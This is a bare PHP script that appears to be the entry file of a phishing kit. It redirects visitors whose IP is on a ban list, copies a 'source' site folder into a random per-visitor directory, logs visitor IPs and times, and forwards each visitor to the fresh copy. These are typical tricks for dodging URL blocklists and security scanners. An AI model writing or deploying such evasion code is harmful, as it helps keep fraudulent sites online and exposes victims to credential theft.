<?php
	
	if(file_exists("SE/Ban.txt"))
	{
	$searchfor = getenv("REMOTE_ADDR");
	$handle = fopen('SE/Ban.txt', 'r');
	while (($buffer = fgets($handle)) !== false) {
    if (strpos($buffer, $searchfor) !== false) {
    	fclose($handle);
		echo "<script type='text/javascript'> document.location = 'https://tinyurl.com/myspark1'; </script>";
    }      
	}
	fclose($handle);
	}	

	$random = rand(0,90000).$_SERVER['REMOTE_ADDR'];
	$dst = substr(md5($random), 0, 5);
	$dst = "bb".$dst;
	function recurse_copy($src, $dst) {
		$dir = opendir($src);
		$result = ($dir === false ? false : true);

		if ($result !== false) {
			$result = @mkdir($dst);

			if ($result === true) {
				while(false !== ( $file = readdir($dir)) ) {
					if (( $file != '.' ) && ( $file != '..' ) && $result) {
						if ( is_dir($src . '/' . $file) ) {
							$result = recurse_copy($src . '/' . $file,$dst . '/' . $file);
						} else {
							$result = copy($src . '/' . $file,$dst . '/' . $file);
						}
					}
				}
				closedir($dir);
			}
		}
		return $result;
	}

	$src="source";
	recurse_copy( $src, $dst);
	
	$filee3 = fopen("SE/Visitors.txt","a");
	date_default_timezone_set("Europe/London");
	fwrite($filee3, "Visitor : ".getenv("REMOTE_ADDR")." ".date("Y/m/d")." ".date("h:i:sa")."\n");
	fclose($filee3);

	header("location: ".$dst);
	exit;

?>
